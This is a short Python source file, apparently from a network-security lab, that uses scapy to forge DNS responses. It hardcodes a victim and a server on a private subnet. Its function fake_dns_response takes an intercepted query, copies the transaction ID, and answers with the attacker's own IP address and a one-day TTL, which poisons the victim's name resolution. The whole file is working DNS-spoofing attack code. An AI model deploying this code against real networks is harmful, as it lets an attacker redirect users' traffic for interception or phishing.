from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import util

networkInterface = "enp0s3"

victimIP = "192.168.56.101"
victimMAC = "08:00:27:b0:a1:ab"

serverIP = "192.168.56.102"
serverMAC = "08:00:27:c6:a4:61"

# attackerIP = get_if_addr(networkInterface)
# attackerMAC = get_if_hwaddr(networkInterface)




def fake_dns_response(pkt, hostIP, networkInterface):
    hostMAC = util.getMAC(hostIP, networkInterface)
    attackerIP = get_if_addr(networkInterface)
    attackerMAC = get_if_hwaddr(networkInterface)
    dns = Ether(src = attackerMAC, dst = hostMAC)/\
          IP(dst = hostIP, src = pkt[IP].dst) /\
          UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport) /\
          DNS(id = pkt[DNS].id, acount = 1, qr = 1, rd =1, qd = pkt[DNS].qd,
              an = DNSRR(rrname = pkt[DNSQR].qname, type ='A', rclass = pkt[DNSQR].qclass, ttl = 86400, rdata = attackerIP))
    dns.show()
    sendp(dns, iface = networkInterface, verbose = False)

